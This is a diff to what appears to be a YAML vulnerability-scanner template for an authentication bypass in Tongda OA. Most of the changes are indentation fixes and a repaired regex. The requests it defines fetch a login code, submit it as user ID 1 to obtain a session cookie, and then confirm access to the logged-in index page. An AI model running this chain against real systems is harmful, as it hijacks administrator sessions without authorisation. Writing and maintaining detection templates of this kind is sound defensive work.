@@ -23,23 +23,23 @@ rules:
       path: /ispirit/login_code.php
     expression: response.status == 200 && response.body.bcontains(b'"codeuid":') && response.body.bcontains(b'"authcode":') && response.headers["content-type"].contains("text/html")
     output:
-        search2: '"\"codeuid\":\"(?P<codeuid>.*?)\"".bsubmatch(response.body)'
-        codeuid: search2["codeuid"]
+      search2: '"\"codeuid\":\"(?P<codeuid>.*?)\"".bsubmatch(response.body)'
+      codeuid: search2["codeuid"]
   r1:
     request:
       method: POST
       path: /logincheck_code.php
       body: |
-       CODEUID=_PC{{codeuid}}&UID=1
+        CODEUID=_PC{{codeuid}}&UID=1
     expression: response.status == 200 && response.body.bcontains(b'"status":1')
     output:
-        search: '"Set-Cookie: PHPSESSID=(?P<phpsessid>.*?\n".bsubmatch(response.raw_header)'
-        phpsessid: search["phpsessid"]
+      search: '"Set-Cookie: PHPSESSID=(?P<phpsessid>.*?)\n".bsubmatch(response.raw_header)'
+      phpsessid: search["phpsessid"]
   r2:
     request:
       method: GET
       path: /general/index.php?isIE=0&modify_pwd=0
-      headers: 
-       Cookie: PHPSESSID={{phpsessid}}
+      headers:
+        Cookie: PHPSESSID={{phpsessid}}
     expression: response.status == 200 && response.body.bcontains(b'loginUser') && response.body.bcontains(b'uid:') && response.body.bcontains(b'user_id:') && response.body.bcontains(b'user_name:')
 expression: r0() && r1() && r2()
